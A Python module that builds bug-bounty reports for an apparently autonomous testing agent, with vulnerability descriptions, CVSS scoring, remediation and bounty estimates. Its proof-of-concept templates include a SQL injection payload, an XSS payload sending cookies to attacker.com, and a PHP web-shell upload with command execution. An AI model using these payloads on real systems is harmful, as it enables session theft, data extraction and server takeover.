import json
import hashlib
import base64
from datetime import datetime
from typing import Dict, Any, List, Optional
from pathlib import Path
from dataclasses import dataclass

@dataclass
class VulnerabilityReport:
    """Structure for individual vulnerability report"""
    title: str
    severity: str
    cvss_score: float
    cwe_id: str
    description: str
    impact: str
    steps_to_reproduce: List[str]
    proof_of_concept: str
    evidence: Dict[str, Any]
    remediation: str
    references: List[str]

    def to_markdown(self) -> str:
        """Convert to markdown format"""
        md = f"## {self.title}\n\n"
        md += f"**Severity:** {self.severity}\n"
        md += f"**CVSS Score:** {self.cvss_score}\n"
        md += f"**CWE:** {self.cwe_id}\n\n"

        md += "### Description\n"
        md += f"{self.description}\n\n"

        md += "### Impact\n"
        md += f"{self.impact}\n\n"

        md += "### Steps to Reproduce\n"
        for i, step in enumerate(self.steps_to_reproduce, 1):
            md += f"{i}. {step}\n"
        md += "\n"

        md += "### Proof of Concept\n"
        md += f"```\n{self.proof_of_concept}\n```\n\n"

        md += "### Evidence\n"
        md += f"```json\n{json.dumps(self.evidence, indent=2)}\n```\n\n"

        md += "### Remediation\n"
        md += f"{self.remediation}\n\n"

        if self.references:
            md += "### References\n"
            for ref in self.references:
                md += f"- {ref}\n"
            md += "\n"

        return md


class ReportBuilder:
    """Builds comprehensive bug bounty reports"""

    def __init__(self):
        self.vulnerability_db = self._load_vulnerability_database()
        self.report_template = self._load_report_template()

    def _load_vulnerability_database(self) -> Dict[str, Dict[str, Any]]:
        """Load vulnerability information database"""
        return {
            'sqli': {
                'title': 'SQL Injection',
                'cwe': 'CWE-89',
                'owasp': 'A03:2021',
                'base_cvss': 7.5,
                'description': 'SQL injection vulnerability allows attackers to interfere with database queries.',
                'remediation': 'Use parameterized queries, stored procedures, and input validation.'
            },
            'xss': {
                'title': 'Cross-Site Scripting (XSS)',
                'cwe': 'CWE-79',
                'owasp': 'A03:2021',
                'base_cvss': 6.1,
                'description': 'XSS allows attackers to inject malicious scripts into web pages.',
                'remediation': 'Implement proper output encoding and Content Security Policy (CSP).'
            },
            'rce': {
                'title': 'Remote Code Execution',
                'cwe': 'CWE-94',
                'owasp': 'A03:2021',
                'base_cvss': 9.8,
                'description': 'RCE allows attackers to execute arbitrary code on the server.',
                'remediation': 'Sanitize user input, use sandboxing, and avoid dynamic code execution.'
            },
            'idor': {
                'title': 'Insecure Direct Object Reference',
                'cwe': 'CWE-639',
                'owasp': 'A01:2021',
                'base_cvss': 6.5,
                'description': 'IDOR allows unauthorized access to resources by manipulating references.',
                'remediation': 'Implement proper access control checks for all resources.'
            },
            'ssrf': {
                'title': 'Server-Side Request Forgery',
                'cwe': 'CWE-918',
                'owasp': 'A10:2021',
                'base_cvss': 7.5,
                'description': 'SSRF allows attackers to make requests from the vulnerable server.',
                'remediation': 'Validate and sanitize URLs, use allowlists, and disable unnecessary protocols.'
            },
            'xxe': {
                'title': 'XML External Entity Injection',
                'cwe': 'CWE-611',
                'owasp': 'A05:2021',
                'base_cvss': 7.5,
                'description': 'XXE allows attackers to interfere with XML processing.',
                'remediation': 'Disable external entity processing in XML parsers.'
            },
            'auth_bypass': {
                'title': 'Authentication Bypass',
                'cwe': 'CWE-287',
                'owasp': 'A07:2021',
                'base_cvss': 8.5,
                'description': 'Authentication bypass allows unauthorized access to protected resources.',
                'remediation': 'Implement robust authentication mechanisms and session management.'
            }
        }

    def _load_report_template(self) -> str:
        """Load report template"""
        return """# Bug Bounty Report

## Report Information
- **Report ID:** {report_id}
- **Date:** {date}
- **Researcher:** {researcher}
- **Program:** {program}
- **Severity:** {overall_severity}

## Executive Summary
{executive_summary}

## Target Information
- **Domain:** {target_domain}
- **Scope:** {scope}
- **Testing Period:** {testing_period}

## Vulnerability Summary
{vulnerability_summary}

## Detailed Findings
{detailed_findings}

## Impact Assessment
{impact_assessment}

## Proof of Concept
{proof_of_concept}

## Recommendations
{recommendations}

## Timeline
{timeline}

## Appendix
{appendix}
"""

    def build(self, target: str, recon: Dict[str, Any],
              steps: List[Any], results: List[Any]) -> str:
        """Build comprehensive bug bounty report"""

        report_id = self._generate_report_id()
        vulnerabilities = self._extract_vulnerabilities(results)

        # Generate report sections
        executive_summary = self._generate_executive_summary(vulnerabilities)
        vulnerability_summary = self._generate_vulnerability_summary(vulnerabilities)
        detailed_findings = self._generate_detailed_findings(vulnerabilities, results)
        impact_assessment = self._generate_impact_assessment(vulnerabilities)
        proof_of_concept = self._generate_proof_of_concept(results)
        recommendations = self._generate_recommendations(vulnerabilities)
        timeline = self._generate_timeline(steps, results)

        # Fill template
        report = self.report_template.format(
            report_id=report_id,
            date=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            researcher="CyberShell Autonomous Agent",
            program=target,
            overall_severity=self._calculate_overall_severity(vulnerabilities),
            executive_summary=executive_summary,
            target_domain=target,
            scope=json.dumps(recon.get('scope', [target])),
            testing_period=f"{datetime.now().strftime('%Y-%m-%d')}",
            vulnerability_summary=vulnerability_summary,
            detailed_findings=detailed_findings,
            impact_assessment=impact_assessment,
            proof_of_concept=proof_of_concept,
            recommendations=recommendations,
            timeline=timeline,
            appendix=self._generate_appendix(results)
        )

        return report

    def generate_vulnerability_report(self, vuln_type: str,
                                     evidence: Dict[str, Any],
                                     target: str) -> VulnerabilityReport:
        """Generate report for a specific vulnerability"""

        vuln_info = self.vulnerability_db.get(vuln_type, {})

        # Calculate CVSS based on evidence
        cvss = self._calculate_cvss(vuln_type, evidence)
        severity = self._cvss_to_severity(cvss)

        # Generate PoC
        poc = self._generate_poc(vuln_type, evidence, target)

        # Generate steps to reproduce
        steps = self._generate_steps(vuln_type, target, evidence)

        # Generate impact description
        impact = self._generate_impact_description(vuln_type, evidence)

        return VulnerabilityReport(
            title=f"{vuln_info.get('title', vuln_type.upper())} in {target}",
            severity=severity,
            cvss_score=cvss,
            cwe_id=vuln_info.get('cwe', 'CWE-Unknown'),
            description=vuln_info.get('description', f'{vuln_type} vulnerability found'),
            impact=impact,
            steps_to_reproduce=steps,
            proof_of_concept=poc,
            evidence=evidence,
            remediation=vuln_info.get('remediation', 'Implement security best practices'),
            references=[
                f"https://cwe.mitre.org/data/definitions/{vuln_info.get('cwe', '').replace('CWE-', '')}.html",
                f"https://owasp.org/Top10/{vuln_info.get('owasp', '')}"
            ]
        )

    def _generate_report_id(self) -> str:
        """Generate unique report ID"""
        timestamp = datetime.now().isoformat()
        hash_obj = hashlib.sha256(timestamp.encode())
        return f"BBR-{hash_obj.hexdigest()[:12].upper()}"

    def _extract_vulnerabilities(self, results: List[Any]) -> List[Dict[str, Any]]:
        """Extract vulnerabilities from results"""
        vulnerabilities = []

        for result in results:
            if not hasattr(result, 'success') or not result.success:
                continue

            details = result.details if hasattr(result, 'details') else {}

            if details.get('vulnerable') or details.get('exploited') or \
               details.get('evidence_score', 0) > 0.5:

                vuln_type = self._identify_vuln_type(result)
                vulnerabilities.append({
                    'type': vuln_type,
                    'plugin': result.name if hasattr(result, 'name') else 'Unknown',
                    'evidence': details,
                    'severity': details.get('severity', 'Medium'),
                    'cvss': details.get('cvss_score', 5.0)
                })

        return vulnerabilities

    def _identify_vuln_type(self, result) -> str:
        """Identify vulnerability type from result"""
        name = result.name.lower() if hasattr(result, 'name') else ''

        for vuln_type in self.vulnerability_db.keys():
            if vuln_type in name:
                return vuln_type

        return 'unknown'

    def _calculate_overall_severity(self, vulnerabilities: List[Dict]) -> str:
        """Calculate overall severity"""
        if not vulnerabilities:
            return "None"

        severities = [v.get('severity', 'Low') for v in vulnerabilities]

        if 'Critical' in severities:
            return 'Critical'
        elif 'High' in severities:
            return 'High'
        elif 'Medium' in severities:
            return 'Medium'
        return 'Low'

    def _generate_executive_summary(self, vulnerabilities: List[Dict]) -> str:
        """Generate executive summary"""
        if not vulnerabilities:
            return "No vulnerabilities were discovered during testing."

        critical_count = sum(1 for v in vulnerabilities if v.get('severity') == 'Critical')
        high_count = sum(1 for v in vulnerabilities if v.get('severity') == 'High')

        summary = f"During the security assessment, {len(vulnerabilities)} vulnerabilities were discovered. "

        if critical_count > 0:
            summary += f"{critical_count} critical vulnerabilities require immediate attention. "

        if high_count > 0:
            summary += f"{high_count} high-severity issues pose significant risk. "

        vuln_types = list(set(v['type'] for v in vulnerabilities))
        summary += f"The main vulnerability categories identified include: {', '.join(vuln_types)}. "

        summary += "Detailed findings and proof of concepts are provided below."

        return summary

    def _generate_vulnerability_summary(self, vulnerabilities: List[Dict]) -> str:
        """Generate vulnerability summary table"""
        if not vulnerabilities:
            return "No vulnerabilities found."

        summary = "| # | Type | Severity | CVSS | Status |\n"
        summary += "|---|------|----------|------|--------|\n"

        for i, vuln in enumerate(vulnerabilities, 1):
            vuln_type = vuln['type'].upper()
            severity = vuln.get('severity', 'Unknown')
            cvss = vuln.get('cvss', 0.0)
            status = "Exploited" if vuln.get('evidence', {}).get('exploited') else "Confirmed"

            summary += f"| {i} | {vuln_type} | {severity} | {cvss:.1f} | {status} |\n"

        return summary

    def _generate_detailed_findings(self, vulnerabilities: List[Dict],
                                   results: List[Any]) -> str:
        """Generate detailed findings section"""
        if not vulnerabilities:
            return "No detailed findings to report."

        findings = ""

        for i, vuln in enumerate(vulnerabilities, 1):
            report = self.generate_vulnerability_report(
                vuln['type'],
                vuln['evidence'],
                vuln.get('target', 'Unknown')
            )

            findings += f"\n### Finding {i}: {report.title}\n"
            findings += report.to_markdown()
            findings += "\n---\n"

        return findings

    def _generate_impact_assessment(self, vulnerabilities: List[Dict]) -> str:
        """Generate impact assessment"""
        if not vulnerabilities:
            return "No security impact identified."

        assessment = "### Business Impact Analysis\n\n"

        impacts = {
            'data_breach': False,
            'account_takeover': False,
            'service_disruption': False,
            'reputation_damage': False,
            'financial_loss': False
        }

        for vuln in vulnerabilities:
            vuln_type = vuln['type']
            evidence = vuln.get('evidence', {})

            if vuln_type in ['sqli', 'idor', 'xxe']:
                impacts['data_breach'] = True

            if vuln_type in ['xss', 'auth_bypass']:
                impacts['account_takeover'] = True

            if vuln_type in ['rce', 'dos']:
                impacts['service_disruption'] = True

            if vuln.get('severity') in ['Critical', 'High']:
                impacts['reputation_damage'] = True
                impacts['financial_loss'] = True

        if impacts['data_breach']:
            assessment += "- **Data Breach Risk:** Sensitive data including PII may be exposed\n"

        if impacts['account_takeover']:
            assessment += "- **Account Takeover:** User and admin accounts can be compromised\n"

        if impacts['service_disruption']:
            assessment += "- **Service Disruption:** Critical services may be interrupted\n"

        if impacts['reputation_damage']:
            assessment += "- **Reputation Damage:** Public disclosure could harm brand reputation\n"

        if impacts['financial_loss']:
            assessment += "- **Financial Loss:** Potential for direct financial impact and regulatory fines\n"

        # Calculate potential bounty
        total_bounty = self._calculate_total_bounty(vulnerabilities)
        assessment += f"\n### Estimated Bug Bounty Value: ${total_bounty:,}\n"

        return assessment

    def _generate_proof_of_concept(self, results: List[Any]) -> str:
        """Generate proof of concept section"""
        poc_section = "### Exploitation Demonstrations\n\n"

        exploits = []
        for result in results:
            if hasattr(result, 'details'):
                details = result.details
                if details.get('exploited') or details.get('impact_proof'):
                    exploits.append({
                        'name': result.name if hasattr(result, 'name') else 'Unknown',
                        'impact': details.get('impact_proof', 'Exploitation successful'),
                        'evidence': details.get('evidence', {})
                    })

        if not exploits:
            return "Proof of concepts are available upon request."

        for exploit in exploits:
            poc_section += f"#### {exploit['name']}\n"
            poc_section += f"{exploit['impact']}\n\n"
            poc_section += "```json\n"
            poc_section += json.dumps(exploit['evidence'], indent=2)[:1000]  # Truncate for readability
            poc_section += "\n```\n\n"

        return poc_section

    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> str:
        """Generate recommendations"""
        if not vulnerabilities:
            return "Continue with current security practices."

        recommendations = "### Priority Recommendations\n\n"

        # Get unique vulnerability types
        vuln_types = list(set(v['type'] for v in vulnerabilities))

        # Critical recommendations
        critical_vulns = [v for v in vulnerabilities if v.get('severity') == 'Critical']
        if critical_vulns:
            recommendations += "#### Immediate Actions Required\n"
            for vuln in critical_vulns:
                vuln_info = self.vulnerability_db.get(vuln['type'], {})
                recommendations += f"- {vuln_info.get('remediation', 'Fix ' + vuln['type'])}\n"
            recommendations += "\n"

        # General recommendations
        recommendations += "#### Security Improvements\n"

        general_recs = [
            "Implement a Web Application Firewall (WAF)",
            "Conduct regular security code reviews",
            "Implement security headers (CSP, X-Frame-Options, etc.)",
            "Use automated security scanning in CI/CD pipeline",
            "Provide security training for developers",
            "Implement rate limiting and DDoS protection",
            "Use secure coding practices and frameworks",
            "Implement comprehensive logging and monitoring"
        ]

        for rec in general_recs[:5]:  # Top 5 recommendations
            recommendations += f"- {rec}\n"

        return recommendations

    def _generate_timeline(self, steps: List[Any], results: List[Any]) -> str:
        """Generate testing timeline"""
        timeline = "| Time | Action | Result |\n"
        timeline += "|------|--------|--------|\n"

        start_time = datetime.now()

        for i, step in enumerate(steps[:10]):  # First 10 steps
            time_offset = i * 5  # Simulate 5 seconds per step
            timestamp = start_time.strftime("%H:%M:%S")

            action = step.plugin if hasattr(step, 'plugin') else 'Unknown'
            result = "Success" if i < len(results) and hasattr(results[i], 'success') and results[i].success else "Failed"

            timeline += f"| {timestamp} | {action} | {result} |\n"

        return timeline

    def _generate_appendix(self, results: List[Any]) -> str:
        """Generate appendix with additional details"""
        appendix = "### Additional Information\n\n"

        appendix += "#### Testing Methodology\n"
        appendix += "- Automated vulnerability discovery\n"
        appendix += "- Manual verification of findings\n"
        appendix += "- Proof of concept development\n"
        appendix += "- Impact assessment\n\n"

        appendix += "#### Tools Used\n"
        appendix += "- CyberShell Autonomous Agent v2.0\n"
        appendix += "- Custom exploitation plugins\n"
        appendix += "- LLM-assisted vulnerability analysis\n\n"

        appendix += "#### Disclaimer\n"
        appendix += "All testing was performed within the authorized scope. "
        appendix += "No data was exfiltrated beyond what was necessary to demonstrate impact. "
        appendix += "All findings are provided for remediation purposes only.\n"

        return appendix

    def _calculate_cvss(self, vuln_type: str, evidence: Dict[str, Any]) -> float:
        """Calculate CVSS score based on evidence"""
        base_score = self.vulnerability_db.get(vuln_type, {}).get('base_cvss', 5.0)

        # Adjust based on evidence
        if evidence.get('data_extracted') or evidence.get('data'):
            base_score += 1.0

        if evidence.get('admin_access') or evidence.get('admin'):
            base_score += 1.5

        if evidence.get('rce') or evidence.get('commands_executed'):
            base_score = max(base_score, 9.0)

        if evidence.get('chained'):
            base_score += 0.5

        return min(10.0, base_score)

    def _cvss_to_severity(self, cvss: float) -> str:
        """Convert CVSS score to severity rating"""
        if cvss >= 9.0:
            return 'Critical'
        elif cvss >= 7.0:
            return 'High'
        elif cvss >= 4.0:
            return 'Medium'
        elif cvss >= 0.1:
            return 'Low'
        return 'Info'

    def _generate_poc(self, vuln_type: str, evidence: Dict[str, Any],
                     target: str) -> str:
        """Generate proof of concept code"""

        poc_templates = {
            'sqli': """
# SQL Injection PoC
import requests

url = "{target}"
payload = "' OR '1'='1' UNION SELECT NULL, database(), NULL--"
params = {{"id": payload}}

response = requests.get(url, params=params)
print("Database:", response.text)
""",
            'xss': """
# XSS PoC
payload = '<img src=x onerror="fetch(`https://attacker.com?c=${document.cookie}`)">'
# Inject into vulnerable parameter
url = "{target}?search=" + payload
# Session will be sent to attacker server
""",
            'rce': """
# RCE PoC
import requests

url = "{target}/upload"
shell = "<?php system($_GET['cmd']); ?>"

files = {{"file": ("shell.php", shell, "application/x-php")}}
response = requests.post(url, files=files)

# Execute commands
cmd_url = "{target}/uploads/shell.php?cmd=whoami"
result = requests.get(cmd_url)
print("Command output:", result.text)
"""
        }

        return poc_templates.get(vuln_type, f"# {vuln_type.upper()} PoC\n# Evidence: {json.dumps(evidence, indent=2)}")

    def _generate_steps(self, vuln_type: str, target: str,
                       evidence: Dict[str, Any]) -> List[str]:
        """Generate steps to reproduce"""

        steps_templates = {
            'sqli': [
                f"Navigate to {target}",
                "Locate the vulnerable parameter (e.g., 'id')",
                "Insert SQL injection payload: ' OR '1'='1",
                "Observe database error or data leakage",
                "Use UNION SELECT to extract data"
            ],
            'xss': [
                f"Navigate to {target}",
                "Locate input field or parameter",
                "Insert XSS payload: <script>alert(1)</script>",
                "Submit the form or navigate to crafted URL",
                "Observe JavaScript execution"
            ],
            'rce': [
                f"Navigate to {target}",
                "Identify command injection point",
                "Insert command injection payload: ; whoami",
                "Submit the request",
                "Observe command execution output"
            ]
        }

        return steps_templates.get(vuln_type, [f"Test {vuln_type} on {target}"])

    def _generate_impact_description(self, vuln_type: str,
                                    evidence: Dict[str, Any]) -> str:
        """Generate impact description"""

        impact_templates = {
            'sqli': "Allows extraction of entire database including sensitive user data, credentials, and business information.",
            'xss': "Enables session hijacking, account takeover, and phishing attacks against users.",
            'rce': "Provides complete system compromise with ability to execute arbitrary commands.",
            'idor': "Allows unauthorized access to other users' data and administrative functions.",
            'ssrf': "Enables access to internal network resources and cloud metadata services.",
            'xxe': "Allows reading of sensitive files and potential SSRF attacks.",
            'auth_bypass': "Provides unauthorized access to protected resources and admin functionality."
        }

        base_impact = impact_templates.get(vuln_type, f"{vuln_type} vulnerability with security impact")

        # Add specific evidence-based impact
        if evidence.get('data'):
            rows = evidence.get('rows', 0)
            base_impact += f" Successfully extracted {rows} database records."

        if evidence.get('admin_access'):
            base_impact += " Achieved full administrative access."

        return base_impact

    def _calculate_total_bounty(self, vulnerabilities: List[Dict]) -> int:
        """Calculate estimated total bounty value"""

        bounty_rates = {
            'Critical': 5000,
            'High': 2000,
            'Medium': 500,
            'Low': 100
        }

        total = 0
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'Low')
            base = bounty_rates.get(severity, 100)

            # Multipliers
            if vuln.get('evidence', {}).get('chained'):
                base *= 1.5

            if vuln.get('evidence', {}).get('novel_technique'):
                base *= 1.25

            total += base

        return int(total)

    def save_report(self, report: str, output_dir: str = "reports"):
        """Save report to file"""
        output_path = Path(output_dir)
        output_path.mkdir(exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = output_path / f"bug_bounty_report_{timestamp}.md"

        filename.write_text(report)

        # Also save as HTML
        html_content = self._markdown_to_html(report)
        html_filename = output_path / f"bug_bounty_report_{timestamp}.html"
        html_filename.write_text(html_content)

        return filename

    def _markdown_to_html(self, markdown: str) -> str:
        """Convert markdown to HTML"""
        html_template = """<!DOCTYPE html>
<html>
<head>
    <title>Bug Bounty Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; }}
        h1 {{ color: #d32f2f; border-bottom: 3px solid #d32f2f; padding-bottom: 10px; }}
        h2 {{ color: #f57c00; border-bottom: 2px solid #f57c00; padding-bottom: 5px; }}
        h3 {{ color: #388e3c; }}
        code {{ background: #f5f5f5; padding: 2px 5px; border-radius: 3px; }}
        pre {{ background: #f5f5f5; padding: 15px; border-radius: 5px; overflow-x: auto; }}
        table {{ border-collapse: collapse; width: 100%; margin: 20px 0; }}
        th, td {{ border: 1px solid #ddd; padding: 12px; text-align: left; }}
        th {{ background: #f57c00; color: white; }}
        tr:nth-child(even) {{ background: #f9f9f9; }}
        .critical {{ color: #d32f2f; font-weight: bold; }}
        .high {{ color: #f57c00; font-weight: bold; }}
        .medium {{ color: #fbc02d; }}
        .low {{ color: #388e3c; }}
    </style>
</head>
<body>
{content}
</body>
</html>"""

        # Basic markdown to HTML conversion (simplified)
        html = markdown
        html = html.replace('# ', '<h1>').replace('\n## ', '</h1>\n<h2>')
        html = html.replace('\n### ', '</h2>\n<h3>').replace('\n#### ', '</h3>\n<h4>')
        html = html.replace('\n\n', '</p>\n<p>')
        html = html.replace('**', '<strong>').replace('**', '</strong>')
        html = html.replace('`', '<code>').replace('`', '</code>')

        return html_template.format(content=html)